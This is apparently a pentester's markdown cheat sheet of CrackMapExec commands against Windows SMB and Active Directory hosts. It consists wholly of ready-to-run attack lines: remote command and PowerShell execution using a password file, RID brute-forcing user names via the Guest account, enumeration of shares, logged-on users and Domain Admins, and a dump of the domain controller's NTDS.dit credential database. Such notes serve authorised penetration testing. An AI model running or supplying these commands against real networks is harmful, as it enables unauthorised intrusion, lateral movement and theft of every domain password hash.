# CrackMapExec

### Pass cmd

```bash
crackmapexec smb ip -u user -p password.txt -x 'command'
```

### Pass powershell

```bash
crackmapexec smb ip -u user -p password.txt -X 'command'
```

### List users if Guest account is enabled

```bash
crackmapexec smb (ip) -u 'Guest' -p '' --rid-brute
```

### Find ip/hostname/SMB Signinig/etc:

```bash
crackmapexec smb up-hosts.txt
```

### Enumerate shares

```bash
crackmapexec smb ip -u user -p password.txt --shares
```

### Look at domain admins

```bash
crackmapexec smb ip -u user -p password.txt -x 'net group "Domain Admins" /domain'
```

### Look at logged on users

```bash
crackmapexec smb ip -u user -p password.txt --loggedon-users
```

### Look at NTDS.dit - is LOUD - USE WITH CAUTION

```bash
crackmapexec smb dc-ip -u domain-admin-user -p password.txt --ntds
```
